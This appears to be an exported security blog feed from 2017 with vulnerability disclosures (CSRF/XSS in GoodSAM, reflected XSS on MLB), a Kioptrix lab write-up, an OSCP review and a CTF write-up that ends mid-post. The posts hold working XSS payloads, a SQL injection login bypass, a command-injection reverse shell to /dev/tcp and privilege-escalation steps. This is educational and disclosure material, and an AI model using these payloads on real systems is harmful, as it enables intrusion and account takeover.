+<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker&rsquo;s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.</p>
+</blockquote>
+<p>The second vulnerability discovered was Stored Cross Site Scripting (XSS) within the same account profile fields, which per OWASP documentation is defined as [1][2][3]:</p>
+<blockquote>
+<p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p>
+</blockquote>
+<p><strong>Account Profile - Cross Site Request Forgery (CSRF):</strong></p>
+<p>The first vulnerability was Cross Site Request Forgery within the account profile update page, which is demonstrated below. Take note of the email address and email entered within it.</p>
+<p><img src="images/GoodSAMCSRF1.png" alt=""></p>
+<p>The next step was to proxy the request with Burp Suite and then send the request to Burp Suite Professional&rsquo;s CSRF PoC generator, by selecting &ldquo;Action &ndash;&gt; Engagement Tools &ndash;&gt; CSRF PoC Generator&rdquo;. As shown below, the name and email address fields were modified with attacker account data, including an XSS payload within the name.</p>
+<p><img src="images/GoodSAMCSRF2.png" alt=""></p>
+<p>Next the &ldquo;Test in browser&rdquo; option was selected and the URL pasted in the web browser. The request was then intercepted by Burp Suite showing the referrer as &ldquo;http://burp/&rdquo; and not &ldquo;<a href="http://www.goodsamapp.org">www.goodsamapp.org</a>&rdquo;. As shown the attacker data is entered as POST parameters.</p>
+<p><img src="images/GoodSAMCSRF3.png" alt=""></p>
+<p>The request was then successfully submitted by the attacker CSRF payload, resulting in the XSS payload being entered into the name field and the emergency contact email being modified.</p>
+<p><img src="images/GoodSAMCSRF4.png" alt=""></p>
+<p>Finally, the &ldquo;Manage&rdquo; option is selected and the XSS payload is successfully executed. This means that an attacker can thereby execute arbitrary JavaScript XSS payloads within GoodSAM user accounts if a user clicks on a link, launches a HTML file or even loads an image with the POST request file as source.</p>
+<p>As demonstrated this can be deadly, as now an attacker can have access to the users account by stealing the user cookie and then the private medical information located within it. Specifically, the attacker would steal the user cookie on every login, using a cookie theft payload.</p>
+<p><img src="images/GoodSAMCSRF5.png" alt=""></p>
+<p><strong>Account Profile - Stored Cross Site Scripting (XSS):</strong></p>
+<p>The first step was to change the profile field &ldquo;Emergency Contact Full Name&rdquo; to <em>&quot;&quot;&gt;<!-- raw HTML omitted -->alert(document.domain)<!-- raw HTML omitted -->&quot;</em> and then press the &ldquo;Update Profile&rdquo; page which results in XSS execution.</p>
+<h2 id="imagesgoodsamxss_1png"><img src="images/GoodSamXSS_1.png" alt=""></h2>
+<p>As demonstrated below, the JavaScript XSS payload is executed, confirming it is within the web application context (<a href="http://www.goodsamapp.org">www.goodsamapp.org</a>).</p>
+<p><img src="images/GoodSamXSS_2.png" alt=""></p>
+<p>Now you may be wondering, how does the XSS attack work exactly? What am I looking for to find such vulnerabilities. Well specifically in this case, the account profile page loads the data within value fields and the value is set within two speech marks (E.g <em>&ldquo;VALUE&rdquo;).</em></p>
+<p>Now due to how HTML works, if you put another &quot; within the payload you will then escape out of the value tag and can inject your own HTML tags within it such as <em>onclick=&quot;<!-- raw HTML omitted -->alert(1)<!-- raw HTML omitted -->&quot;</em> or by fully escaping the input tag by doing <em>&quot;&gt;<!-- raw HTML omitted -->alert(1)<!-- raw HTML omitted --></em> which is what I did in this case.</p>
+<p><img src="images/Screenshot-at-2017-07-17-230539.png" alt=""></p>
+<p><strong>Chanining CSRF/XSS Demonstration:</strong></p>
+<!-- raw HTML omitted -->
+<h2 id="disclosure-issues">Disclosure Issues:</h2>
+<p>Previously I have found vulnerabilities within other websites and have happily disclosed them to vendors and/or organisations, resulting in typically a positive or neutral response and the issue being resolved. (See below).</p>
+<p><img src="images/disclosure1.png" alt=""></p>
+<p><img src="images/disclosure2.png" alt=""></p>
+<p>However in this case, as soon as I emailed the proof of concept and technical information I received this response, without asking for further clarification.</p>
+<p><img src="images/disclosure3.png" alt=""></p>
+<p>I then sent further technical information, proof of concept and a video demonstrating the attack/impact:</p>
+<p><img src="images/disclosure5.png" alt=""></p>
+<p>GoodSAM then responded to me, further dismissing and ignoring the two vulnerabilities stating that their &ldquo;Machine Learning&rdquo; prevents the attacks, yet I have a full video demonstrating a proof of concept.</p>
+<p><img src="images/disclosure4.png" alt=""></p>
+<p>Finally, after going backwards and forwards without a resolution I asked if they plan on resolving the issues and may I disclose the vulnerabilities on my blog if this is the case and have since left it at that.</p>
+<p><img src="images/disclosure6.png" alt=""></p>
+<h2 id="feedbacksuggestions"><strong>Feedback/Suggestions:</strong></h2>
+<p>My feedback and suggestions to the GoodSAM team, would be to ensure they honour their commitment to taking security seriously [7], even though this vulnerability is not a critical RCE (Remote Code Execution) or severely critical vulnerability, it is still a vulnerability that can attack users via phishing, or other means to achieve full account takeover and compromise of highly sensitive and private medical information, that once stolen is in the wild potentially. Additionally, by taking a defence in depth approach to security, you mitigate the possibility of medium risk vulnerabilities being chained to achieve further levels of access, as well as committing to your statement of &ldquo;data security&rdquo;.</p>
+<p>Additionally, resolving XSS and CSRF vulnerabilities do not put undue burden on the organisation and can be easily remediated by implementing input sanitization, encoding and filtering along with ensuring POST requests have anti-CSRF or verification tokens, to ensure they are only sent within the site context and not by third party websites [3][5][6].</p>
+<h2 id="references"><strong>References:</strong></h2>
+<p><em>[1] <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></em> <em>[2] <a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)</a></em> <em>[3] <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></em> <em>[4] <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)</a></em> <em>[5] <a href="https://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/CSRF_Prevention_Cheat_Sheet</a></em> <em>[6] <a href="https://www.owasp.org/index.php/Defense_in_depth">https://www.owasp.org/index.php/Defense_in_depth</a></em> [7] <a href="https://www.goodsamapp.org/dataprotection">https://www.goodsamapp.org/dataprotection</a></p>
+<h2 id="disclosure-timeline"><strong>Disclosure Timeline:</strong></h2>
+<p><em>30th June, 2017 at 23:08 GMT. Email sent requesting security contact information.</em> <em>14th July, 2017 at 19:51 GMT. No response from first email, vulnerability POC/information sent to three listed email addresses.</em> <em>14th July, 2017 at 20:07 GMT. Reply received (Technical Director), dismissing vulnerability as non-issue.</em> <em>14th July, 2017 at 20:26 GMT. Further technical information sent, including video PoC.</em> <em>15th July, 2017 at 14:58 GMT. Reply received (Technical Director), further dismissing vulnerability.</em> <em>15th July, 2017 at 15:24 GMT. Further explanation/clarification sent, explaining risks.</em> <em>17th July, 2017 at 14:12 GMT. Email sent requesting update/checking email was received and permission to disclose, if no intention of resolving issue.</em> <em>17th July, 2017 at 15:55 GMT. Reply received (Technical Director). Advises I can disclose or notify whoever and that they have no interest talking or speaking to me, unless I can breach their servers and extract data.</em> <em>17th July, 2017 at 19:30 GMT. Full Disclosure via Blog.</em></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Major League Baseball Reflected XSS</title>
+            <link>https://jamesit.github.io/2017/07/15/major-league-baseball-reflected-xss/</link>
+            <pubDate>Sat, 15 Jul 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/07/15/major-league-baseball-reflected-xss/</guid>
+            <description>Recently I have been looking for vulnerabilities such as XSS/CSRF within online applications and came across an XSS vulnerability within the Major League Basketball (MLB) website, which in question was vulnerable to reflected XSS. I did attempt responsible disclosure through Open Bug Bounty [3] and attempted contact via Twitter also, with no response returned and hence full disclosure.
+In particular, the website was vulnerable within the &amp;ldquo;FORM_CODE&amp;rdquo; parameter with the payload of &amp;ldquo;&amp;ndash;!</description>
+            <content type="html"><![CDATA[<p>Recently I have been looking for vulnerabilities such as XSS/CSRF within online applications and came across an XSS vulnerability within the Major League Basketball (MLB) website, which in question was vulnerable to reflected XSS. I did attempt responsible disclosure through Open Bug Bounty [3] and attempted contact via Twitter also, with no response returned and hence full disclosure.</p>
+<p>In particular, the website was vulnerable within the &ldquo;FORM_CODE&rdquo; parameter with the payload of &ldquo;&ndash;!&gt;&lt;Svg/Onload=confirm(' OPENBUGBOUNTY')&gt;&rdquo; being used to exploit the reflected XSS vulnerability. (See below).</p>
+<p><img src="images/MLB_POC.png" alt=""></p>
+<h2 id="vulnerability-information"><strong>Vulnerability Information</strong></h2>
+<p>The &ldquo;FORM_CODE&rdquo; parameter is vulnerable within the link rel and meta property tags, as shown below and within the above screenshots. (See <a href="https://pastebin.com/KztVKeFc">https://pastebin.com/KztVKeFc</a> for URL).</p>
+<p><img src="images/MLB_Vuln.png" alt=""></p>
+<h2 id="feedbacksuggestions"><strong>Feedback/Suggestions:</strong></h2>
+<p>MLB should implement input filtering and encoding on all user supplied input to ensure raw XSS/HTML data is not executed within the user context. [1] [2].</p>
+<h2 id="further-information"><strong>Further Information:</strong></h2>
+<p>[1] https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) [2] https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet [3] <a href="https://www.openbugbounty.org/incidents/229173/">https://www.openbugbounty.org/incidents/229173/</a></p>
+<h2 id="disclosure-timeline"><strong>Disclosure Timeline:</strong></h2>
+<p>29 April, 2017 at 12:22 GMT Vulnerability reported via Open Bug Bounty 1 May, 2017 at 06:31 GMT Vulnerability verified and confirmed 1 May, 2017 at 06:31 GMT Notification sent to generic security emails / Tweets sent to MLB. 1 May, 2017 at 06:31 GMT Notification sent to emails provided by researcher 1 May, 2017 at 10:17 GMT Notification sent to subscribers (without technical details) 29 May, 2017 at 07:15 GMT Vulnerability details publicly disclosed (Open Bug Bounty) 15 July, 2017 at 09:50 GMT Vulnerability details publicly disclosed (Blog)</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Kioptrix 1.1 (Level 2) Writeup</title>
+            <link>https://jamesit.github.io/2017/02/11/kioptrix-1.1-level-2-writeup/</link>
+            <pubDate>Sat, 11 Feb 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/02/11/kioptrix-1.1-level-2-writeup/</guid>
+            <description>I&amp;rsquo;ve decided to start a series of blog posts with write ups from Vuln Hub to keep my skills up to date, and learn more offensive techniques.
+The first step was to use nmap which revealed the presence of various open ports and in particular port 80 (HTTP).
+nmap -sS -T5 192.168.74.134 Nmap scan report for 192.168.74.134 Host is up (0.00018s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 443/tcp open https 631/tcp open ipp 3306/tcp open mysql</description>
+            <content type="html"><![CDATA[<p>I&rsquo;ve decided to start a series of blog posts with write ups from Vuln Hub to keep my skills up to date, and learn more offensive techniques.</p>
+<p>The first step was to use nmap which revealed the presence of various open ports and in particular port 80 (HTTP).</p>
+<p>nmap -sS -T5 192.168.74.134 <code>Nmap scan report for 192.168.74.134 Host is up (0.00018s latency). Not shown: 994 closed ports PORT     STATE SERVICE 22/tcp   open  ssh 80/tcp   open  http 111/tcp  open  rpcbind 443/tcp  open  https 631/tcp  open  ipp 3306/tcp open  mysql</code></p>
+<p>After viewing the web page, a administrative login panel was found. The first step was to attempt to perform SQL injection to see if the web page is vulnerable. The username of &ldquo;admin&rdquo; and &ldquo;wrongpassword' OR &lsquo;a&rsquo;=&lsquo;a&rdquo; was utilised to bypass the login page.</p>
+<p><img src="images/Selection_103.png" alt=""></p>
+<p>Voila! We have access. After gaining access, I attempted to include another command along with the IP address to test for the lack of input filtering. If successful, this should display the passwd file.</p>
+<p><img src="images/Selection_105.png" alt=""></p>
+<p>And there we have it, the passwd file is displayed along with the ping command which confirms the presence of command injection. The next step will be to attempt to gain shell access to the system.</p>
+<p><img src="images/Selection_104.png" alt=""></p>
+<p>A bash one liner was entered along with the localhost IP address, which should give send a reverse TCP shell on port 53 to the attacker machine. The following command was entered:</p>
+<p><code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.74.133/53 0&gt;&amp;1</code></p>
+<p><img src="images/Selection_107.png" alt=""></p>
+<p>Boom! We have shell, as you can see below the shell is running under the Apache account which means privilege escalation will need to be performed.</p>
+<p><img src="images/Selection_106.png" alt=""></p>
+<p>The next step was to verify the kernel version in an attempt to find a kernel privilege escalation exploit.</p>
+<p><img src="images/Selection_112.png" alt=""></p>
+<p>After using Google/Searchsploit, a exploit was found very quickly as shown below.</p>
+<p><img src="images/Selection_113.png" alt=""></p>
+<p><a href="https://www.exploit-db.com/exploits/9542/"><em>https://www.exploit-db.com/exploits/9542/</em></a></p>
+<p>The exploit was downloaded from the attacker machine into the tmp directory and then compiled by using gcc.</p>
+<p><img src="images/Selection_111.png" alt=""></p>
+<p>Finally, the exploit was executed which resulted in a root shell. Sweet!</p>
+<p><img src="images/Selection_110.png" alt=""></p>
+<p>If you have any questions, feel free to leave a comment or contact me via Twitter/Email. More write ups to follow in the coming weeks.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>PWK &amp; OSCP Review - I Tried Harder</title>
+            <link>https://jamesit.github.io/2017/02/02/pwk-oscp-review-i-tried-harder/</link>
+            <pubDate>Thu, 02 Feb 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/02/02/pwk-oscp-review-i-tried-harder/</guid>
+            <description>Over the Christmas break from university, I decided that I&amp;rsquo;d take the PWK (OSCP) course which gave me something to do over the Christmas break and ensured I had plenty of time to complete the course. Having previously done other cyber security courses such as Comp Tia Security+ and eLearnSecurity&amp;rsquo;s PTPV4 course, I liked the fact that the PWK course was heavily practical in nature and had an extensive virtual lab to test penetration testing techniques on a variety of systems.</description>
+            <content type="html"><![CDATA[<p>Over the Christmas break from university, I decided that I&rsquo;d take the PWK (OSCP) course which gave me something to do over the Christmas break and ensured I had plenty of time to complete the course. Having previously done other cyber security courses such as Comp Tia Security+ and eLearnSecurity&rsquo;s PTPV4 course, I liked the fact that the PWK course was heavily practical in nature and had an extensive virtual lab to test penetration testing techniques on a variety of systems.</p>
+<p>In my opinion the OSCP certification is worth the initial cost and has a high return of investment, compared to other certifications due to the fact the course is practical and proves to employers the candidate is competent in penetration testing concepts and can apply them to a multitude of environments. Having spoken to hiring managers, the OSCP qualification is highly desirable and is vastly gaining recognition around the world, which makes this certification an excellent way to get into the information security field.</p>
+<h1 id="background">Background</h1>
+<p>I&rsquo;m currently a third year BSc(Hons) Ethical Hacking Student at the University of Abertay and have three years of experience within the IT sector in various environments such as HelpDesk &amp; System Administration (Linux/Windows). I&rsquo;ve also taken eCPPT before and hold CompTia A+, Sec+, Net+ and MCITP: Enterprise Desktop Support Technician. I would say my previous experience with Windows/Linux did help, although my programming/scripting skills where pretty basic before I took OSCP and managed to improve them during the course.</p>
+<h1 id="who-should-take-the-course"><strong>Who should take the course?</strong></h1>
+<p>In my opinion anyone can take this course, however you must have a general understanding of TCP/IP Networking, Linux/Windows command line syntax, basic security concepts, Google Kung Fu and Bash/Python/Perl scripting knowledge will come in useful too. You must also have a passion and dedication to keep going and try harder, if you are the sort of person who needs to be hand held then this course may not be for you.</p>
+<p>Although, if you are used to being guided then changing that strategy to self-learning will ensure you succeed in the lab. In essence, you must be willing to research areas you are struggling with and dive deeper into concepts/tools/exploits and vulnerabilities that OffSec does not provide information on. Resources such as Exploit-DB, Stack Overflow and Google have helped me tremendously. If you get stuck on something, keep googling and try to locate the relevant knowledge to understand further what you need to do as OffSec admins will not give you answers.</p>
+<h1 id="pwk-labs"><strong>PWK Labs</strong></h1>
+<p>The bread and butter of the PWK course is the labs and not the actual training material, upon receiving the PWK course material you will get access to the labs by connecting to the VPN server with the provided credentials. I will not reveal the total amount of systems, however there is a huge number of systems with a extensive variety of both Windows &amp; Linux operating systems and numerous vulnerabilities from web applications, vulnerable services and misconfiguration issues/unpatched systems which allows you to practice your skills in numerous areas in a safe environment.</p>
+<p>Another point to note, is that the labs are a shared environment and other students may be on the same systems, so you should check the revert time of a machine was not too recently before working on it and revert the machine before you start enumeration attempts. There has been a few times where a student has modified the system in a way that was not intended or left privilege escalation information/exploits which spoiled the process for me. Always revert!!</p>
+<p>On the topic of Metasploit usage within the labs, you may use whatever tools/exploits you wish from it. However, in my opinion you should be careful to not limit yourself to being a tool monkey using only Metasploit and remember you can only use it once during the exam. There are plenty of manual exploits available which may need to be modified but this will enhance your understanding of working with exploits, shellcode and getting to know how they work. I already knew the basics of Metasploit so did not need to learn much of the tool, however if you do not have much experience with it by all means use it to learn and test out various techniques but also attempt with manual exploits.</p>
+<p>Finally, you will be expected to break into systems on four networks (Public/IT/Dev &amp; Admin). which may require the use of tunnelling/pivoting techniques. I&rsquo;d advise you fully read and understand that section within the PDF as it will help tremendously. I&rsquo;d also recommend treating this like a real penetration test, you will need to start enumeration from the basics to find hosts to target first which can be done using various ping sweep techniques, nmap scans and other methods. So remember your training and TRY HARDER!</p>
+<p>Having finished the labs and exam, I very much miss the labs and wish I could go back and keep going breaking into more systems. The labs are VERY addictive and I did not find this to be a typical course/exam because of that very reason and practical courses are more of my style.</p>
+<h1 id="oscp-exam"><strong>OSCP Exam</strong></h1>
+<p>During the OSCP exam you will be provided with a VPN connection to a lab environment and will have 23 hours and 45 minutes to achieve the required number of points on the exam (70 points) and points may be awarded for partial compromise (low privilege access). Each exam machine is worth a different number of points and after completing the first part of the exam, you will then have 24 hours to complete an exam report on your progress and may also send in with that the course exercise/lab report. I would highly recommend completing the lab report and the exercises as this may give you +10 points on the exam, as long as you follow the requirements and complete the documentation thoroughly.</p>
+<p>I myself did complete both lab/exercise report and submitted this with the exam report, and would highly recommend you do this along with using the recommended report template from PWK. Both resources can be found below to get further information on the exam.</p>
+<p><a href="https://support.offensive-security.com/#!oscp-exam-guide.md">https://support.offensive-security.com/#!oscp-exam-guide.md</a> <a href="https://www.offensive-security.com/pwk-online/PWKv1-REPORT.doc">https://www.offensive-security.com/pwk-online/PWKv1-REPORT.doc</a></p>
+<p>I started my exam at 12:00 and immediately started to run enumeration scripts, and identify potential vulnerabilities which took me around two hours to do. After this I got my first full compromise which gave me some points. Around three and a half hours into my exam I managed to exploit another system and worked on privilege escalation. I then took a break and went and had something to eat.</p>
+<p>After this, I then spent another two hours trying to get one of the low point machines, however I kept banging my head against the wall as I was obviously missing something simple despite enumerating the hell out of the machine. As I was making very little progress, I moved on to one of the higher point machines and further enumerated this which took up the majority of my time until I realised what I was missing. After gaining access to the machine, I spent the next few hours after this attempting privilege escalation which was successful. At this point it was around 2am. After another break, I got back to exploiting the low point machine with very little success again. I knew with the current hosts I had, and with my points from the lab report I would pass most likely.</p>
+<p>However I kept trying harder, and moved onto another high point machine and did not manage to gain access to the machine. At this point it was around 5am and my brain was fried, I set an alarm for 3 hours and went to sleep.</p>
+<p>After waking up and grabbing a coffee and 30 minutes of reviewing the host enumeration data I gained access to the machine and got my fourth machine. At this point I knew I&rsquo;d passed and was very happy indeed! I kept on going to exploit the last host, however could not find a way in. I stopped at around 10:50am and ensured I had all screenshots and then started to work on the report which took me a number of hours as I wanted to ensure it was perfect. I then submitted my 26 page exam report along with lab/exercise report. And patiently awaited the results, which came back around two days later with a pass!</p>
+<p><img src="images/C20q8iiWQAApF-O.png" alt="Embedded"></p>
+<h1 id="conclusion"><strong>Conclusion</strong></h1>
+<p>The OSCP course is absolutely fantastic and did not feel like a course at all, I&rsquo;m sure they should add a warning to the course to say it&rsquo;s extremely addicting!! Having withdrawal symptoms already!. In all seriousness, I would highly recommend this course to anyone with a passion and dedication to wanting to enter the information security field as long as you have the pre-requisite knowledge. Despite some reviews that mentioned scripting/programming experience is a must, I would disagree with this as my prior programming experience was not too great and with further research using online resources and exploit development tutorials I was able to make things work without issue.</p>
+<p>The most important aspect of this course is the drive to succeed and you must push yourself to Try Harder! I&rsquo;m very proud of achieving this qualification and it&rsquo;s something I can say I dedicated time to and worked for, unlike other qualifications that are just memorization tests.</p>
+<p>I would also recommend you purchase enough lab time, depending on your time commitments and skill level and if you do not have the pre-requisite knowledge then I would recommend further learning before taking OSCP with courses such as PTS and/or PTP from eLearnSecurity. Another thing to note is, people taking this course may exploit machines at a different rate than you and/or even pass first time. Not everyone may pass first time, as everyone has different knowledge and ways of doing things. So keep going, and do not stop till you pass! I was surprised that I passed first time, however I did put a lot of effort into the course which paid off in the end.</p>
+<h1 id="enumeration-scripts">Enumeration Scripts</h1>
+<p>During the course of the PWK labs, I created two bash scripts which I used in combination with other tools for all enumeration attempts which was very successful. I&rsquo;m hoping to further develop my basic bash scripts into a more suitable Python script with multi-threading to save time in the future. You may download them below, however I would recommend developing something on your own.</p>
+<p>NMAPv2.sh <a href="http://pastebin.com/e4zRNywc">http://pastebin.com/e4zRNywc</a></p>
+<p>HTTPEnum.sh <a href="http://pastebin.com/kv6qcUHh">http://pastebin.com/kv6qcUHh</a></p>
+<h1 id="useful-resources"><strong>Useful Resources</strong></h1>
+<p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> <a href="https://it-ovid.blogspot.co.uk/2012/02/windows-privilege-escalation.html">https://it-ovid.blogspot.co.uk/2012/02/windows-privilege-escalation.html</a> <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">https://pentest.blog/explore-hidden-networks-with-double-pivoting/</a> <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> <a href="http://www.fuzzysecurity.com/tutorials/expDev/1.html">http://www.fuzzysecurity.com/tutorials/expDev/1.html</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>SIGINT CTF 2017 Writeup</title>
+            <link>https://jamesit.github.io/2017/01/22/sigint-ctf-2017-writeup/</link>
+            <pubDate>Sun, 22 Jan 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2017/01/22/sigint-ctf-2017-writeup/</guid>
+            <description>The other week me and a team from Abertay University went to Edinburgh for a CTF hosted by SIGINT. The CTF was a jeopardy style CTF with various categories of challenges such as Binary Exploitation, Reverse Engineering, Web Challenges and more. Unfortunately as there was a team limit of four, I was unable to join the team from my university and was placed with another team.
+I decided I&amp;rsquo;d post a blog post on some of the challenges I undertook, and how I solved them.</description>
+            <content type="html"><![CDATA[<p>The other week me and a team from Abertay University went to Edinburgh for a CTF hosted by SIGINT. The CTF was a jeopardy style CTF with various categories of challenges such as Binary Exploitation, Reverse Engineering, Web Challenges and more. Unfortunately as there was a team limit of four, I was unable to join the team from my university and was placed with another team.</p>
+<p>I decided I&rsquo;d post a blog post on some of the challenges I undertook, and how I solved them. I have not included answers to the trivia and other simpler challenges which we solved as a team. This blog post address&rsquo;s one of the web challenges and the RBS bank safe challenge that I completed.</p>
+<h1 id="ctf-scoreboard">CTF Scoreboard</h1>
+<p>Throughout the day, the progress was pretty steady-going and head to head with the first team (Russel V2.0), which coincidentally was the team from Abertay University which I was supposed to be representing. Once the CTF came to an end, our team ended up in 2nd place and 200 points behind first place. In hindsight, the CTF was a really good experience and for being a randomly put together team, was a success.</p>
+<p><img src="images/Selection_516.png" alt=""></p>
+<p><img src="images/Selection_517.png" alt=""></p>
+<h1 id="nigel---400-points"><strong>Nigel - 400 Points</strong></h1>
+<p>The CTF challenge took us to a webpage which was <a href="http://nigel.sigint.mx">http://nigel.sigint.mx</a> and upon inspection displayed the following webpage.</p>
+<p><img src="images/Selection_326-2.png" alt=""></p>
+<p>DirSearch was then utilised to scan for directories on the web server, which highlighted some interesting files and folders.</p>
+<p><img src="images/Selection_329.png" alt=""><img src="images/Selection_327.png" alt=""></p>
+<p>After visiting the &ldquo;admin.php&rdquo; file, it displayed a message saying &ldquo;You must be an administrator to view this page&rdquo;, the next step was to investigate the application further which was done by using Burp Suite. After utilising burp suite, a interesting session header was noted.</p>
+<p><img src="images/burp.png" alt=""></p>
+<p>￼The session cookie was then copied into a bash terminal and echoed into base64 -d to decode the string, which was displayed below.</p>
+<p><img src="images/Selection_334.png" alt=""></p>
+<p>The encoded hash was then entered into hash-identifier which resulted in the hash being detected as SHA256.</p>
+<p><img src="images/Selection_336.png" alt=""></p>
+<p>After reviewing the code, the quoted value of &ldquo;0&rdquo; was changed to &ldquo;1&rdquo; to see if this would change the application logic into allowing access to the website, the string was then encoded with base64.</p>
+<p><img src="images/Selection_335.png" alt=""></p>
+<p>The encoded string was then sent by modifying the session cookie header and after being sent through the Burp Suite Proxy, the following message appeared.</p>
+<p><img src="images/Selection_330-1.png" alt=""></p>
+<p>The next step was to investigate the SHA256 string. After some research, the possibility of the SHA256 being a HMAC hash was evident. This meant that whatever was changed within the cookie would not infact log us in, because of the HMAC hash not matching up to the data sent. HMAC requires a key, which we did not have. Various attempts at using keys such as &ldquo;nigel&rdquo;, &ldquo;dev&rdquo; and &ldquo;admin&rdquo; were used initially.</p>
+<p>After reviewing the &ldquo;/dev.php&rdquo;, an image of Nigel captioned &ldquo;I feel smashing&rdquo; was discovered. The image in question had a pixellated error and appeared to be modified. The &ldquo;strings&rdquo; command was executed on the dev.jpg image, which resolved in the detection of a base64 encoded string.</p>
+<p><img src="images/Selection_358.png" alt=""></p>
+<p>After decoding the base64 text, string appeared which appeared to be further encoded/encrypted.</p>
+<p><img src="images/Selection_359.png" alt=""></p>
+<p>An online ROT13 tool was utilised with the key being set to &ldquo;guess&rdquo;, this resulted in a clear text unencrypted key, as shown below.</p>
+<p><img src="images/Selection_356.png" alt=""></p>
+<p>The string along with the HMAC key was then encoded using an online SHA256 hash calculator, which is shown below.</p>
+<p><img src="images/sha256.png" alt=""></p>
+<p>The following cookie was then sent to the server by using the Burp Suite Proxy intercept on the &ldquo;/admin.php&rdquo; web page.</p>
+<p><code>sea:1:{s:5:&quot;admin&quot;;s:1:&quot;1&quot;;}dd02f66c96a8b84bda467faaf7d4b474390be25591237811dfbeb1b5ee9f7c04</code></p>
+<p>Finally, after sending the above cookie to the server the flag was discovered.</p>
+<p><img src="images/Selection_355.png" alt=""></p>
+<h1 id="linux-privilege-escalation---200-points">Linux Privilege Escalation - 200 Points</h1>
+<p>Another challenge was to download a Linux VM image, and escalate privileges to root. The .ova VM was downloaded and then imported into VMWare. The low privilege user was named &ldquo;attacker&rdquo;.</p>
+<p>The first step was to check for the existence of sudo and the sudo entries by running &ldquo;sudo -ll&rdquo;. After running this command, the vi text editor was discovered as an authorised sudoers command, that can be executed by all users. This instantly means game over, as the privilege escalation is simple.</p>
+<p><img src="images/Selection_511.png" alt=""></p>
+<p>The following command was then executed &ldquo;sudo vi /etc/passwd&rdquo;. After opening the vi text editor, the &ldquo;x&rdquo; was removed after &ldquo;root:&rdquo;, which removes the password from the user. The file was then saved.</p>
+<p><img src="images/Selection_512.png" alt=""></p>
+<p>As shown below the file was written to disk, and &ldquo;su&rdquo; was used to switch users to root. The privilege escalation was successful. Easy eh?</p>
+<p><img src="images/Selection_513.png" alt=""></p>
+<h1 id="bank-safe-challenge---400-points">Bank Safe Challenge - 400 Points</h1>
+<p>For the safe challenge, a separate wireless network was given to us along with a password and no other information apart from open the safe that is present in the room.</p>
+<p>The first step was to identify hosts on the network, which was done by using the nmap command &ldquo;nmap -sS 192.168.0.1-254&rdquo;. After running the command, one host with particularly interesting ports was the host 192.168.0.3.</p>
+<p>The host had a few ports open, however one interesting port to note was 31337. As nmap did not display the version number of the FTP server, netcat was utilised to retrieve the banner and revealed the version number of vsFTPd 2.3.4.</p>
+<p><img src="images/ftp.png" alt=""></p>
+<p>The FTP client was used to connect to the server with anonymous credentials (anonymous/anonymous). This was successful and allowed for file traversal.</p>
+<p><img src="images/ftp2-1.png" alt=""></p>
+<p>Using exploit database, I quickly discovered that vsftpd 2.3.4 may be vulnerable to command execution via a known backdoor with the software.</p>
+<p><img src="images/exploitdb.png" alt=""></p>
+<p><a href="https://www.exploit-db.com/exploits/17491/">https://www.exploit-db.com/exploits/17491/</a></p>
+<p>The vsftpd exploit was used within msfconsole using the default options (Along with setting the RHOST). As shown below, remote command execution was successful.</p>
+<p><img src="images/Selection_342.png" alt=""></p>
+<p>The next step was to launch a bash shell environment by using the following command:</p>
+<p>&ldquo;find / -name blahblah -exec /bin/awk ?BEGIN {system(&quot;/bin/bash&rdquo;)}' \;&quot;</p>
+<p>The next step was to download a privilege escalation script named &ldquo;unix-privesc-check&rdquo; which was downloaded by using wget into the &ldquo;/tmp&rdquo; directory. After executing the script, two interesting results were found, the main one in particular was the presence of a cronjob which was set to run every second and then remove the file. In addition to this, the file was set to be run as root.</p>
+<p><img src="images/Selection_343.png" alt=""></p>
+<p>The script also discovered insecure permissions of the billy home directory, which means the current user can write to that directory. In particular, I was now able to write the &ldquo;open_safe.py&rdquo; file to the home directory and that would be executed as root.</p>
